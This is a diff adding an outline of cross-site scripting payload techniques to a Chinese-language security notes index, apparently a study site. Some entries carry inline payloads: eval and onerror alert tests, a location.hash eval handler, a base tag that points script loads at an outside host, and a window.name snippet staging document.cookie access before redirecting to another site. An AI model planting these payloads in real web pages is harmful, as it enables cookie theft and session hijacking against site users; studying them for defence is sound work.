@@ -30,3 +30,30 @@ layout: default
 - ![](../img/github5.png)![](../img/yes.png) XSS
   - ![](../img/yes.png) XSS payload
     - ![](../img/yes.png)[获取cookie+浏览器信息+插件](huoqucookie)
+    - ![](../img/yes.png)[模拟发送请求](xssrequests)
+  - ![](../img/yes.png) 构造思路
+    - ![](../img/yes.png) 注意闭合
+    - ![](../img/yes.png) 利用\<>标记注射
+    - ![](../img/yes.png) [标签属性值注射](biaoqianshuxing)
+    - ![](../img/yes.png) [对标签属性值转码](biaoqianzhuanma)
+    - ![](../img/yes.png) [关键字拆分嵌套](guanjianzichaifen)
+    - ![](../img/yes.png) [产生事件](chanshengshijian)
+    - ![](../img/yes.png) 利用eval( )
+      - \<script>eval("alert('XSS')");\</script>
+    - ![](../img/yes.png) [利用CSS跨站剖析](liyongcss)
+    - ![](../img/yes.png) aa.innerHTML="xxxxxxxxxxxx"
+      - 这种情况下。xxxxx 只能使用 \<img src=1 onerror=alert(1)> 这种方式来触发 JS
+    - ![](../img/yes.png) location.hash
+      - \<input type="text" value="" onclick="eval(location.hash.substr(1))"/>
+    - ![](../img/yes.png) 使用\<base>标签
+      - \<base href="http://www.8pwn.com"/>\<script src="x.js"></script>
+    - ![](../img/yes.png) window.name
+
+       ```
+       <script>
+       window.name = "alert(document.cookie)";
+       location.href = "http://www.xss.com/xssed.php";</script>
+       ```
+    - ![](../img/yes.png) [绕过过滤的方法](xssraoguo)
+    - ![](../img/yes.png) 动态调用远程JS
+  - ![](../img/yes.png) [XSS模型](xssmoxing)
